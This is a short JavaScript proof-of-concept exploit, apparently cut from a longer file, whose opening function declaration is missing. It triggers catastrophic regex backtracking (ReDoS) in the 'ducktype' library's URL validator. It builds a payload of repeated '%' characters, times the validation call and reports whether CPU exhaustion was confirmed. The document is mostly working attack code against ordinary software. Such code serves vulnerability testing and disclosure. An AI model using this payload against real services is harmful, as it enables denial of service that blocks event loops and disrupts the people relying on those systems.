  const ducktype = require('ducktype');
  const urlValidator = ducktype.url;

  // The original vulnerable regex in ducktype contains two adjacent optional 
  // character classes that share numerous characters (e.g., '.', '/', '-', '_', '%', '+').
  // When the engine fails to match at the end of the string, it backtracks 
  // by attempting every possible partition of these shared characters between 
  // the two groups, resulting in exponential O(2^n) complexity.

  // We use '%' because it explicitly appears in both overlapping character classes.
  // A length of ~16 characters yields >30k backtrack paths (2^15). We use 24 
  // to comfortably exceed the limit and guarantee observable overhead.
  const maliciousPayload = 'http://localhost/' + '%'.repeat(24) + '!';

  console.log('[*] Triggering ReDoS on ducktype URL validator...');

  const startTime = performance.now();

  // Executing the test forces catastrophic backtracking.
  // No try-catch block is used to ensure any runtime exceptions 
  // (e.g., from exceeding backtrack limits or engine stack overflow) 
  // propagate visibly as requested.
  const result = urlValidator.test(maliciousPayload);

  const elapsed = (performance.now() - startTime).toFixed(2);

  if (elapsed > 50) {
    console.warn(`[!] ALERT: Excessive CPU consumption detected (${elapsed}ms). ReDoS confirmed.`);
  } else {
    console.log('[*] Validation completed quickly. In unoptimized environments or without JIT mitigations, this would block the event loop indefinitely.');
  }

  return result;
}

await exploit();
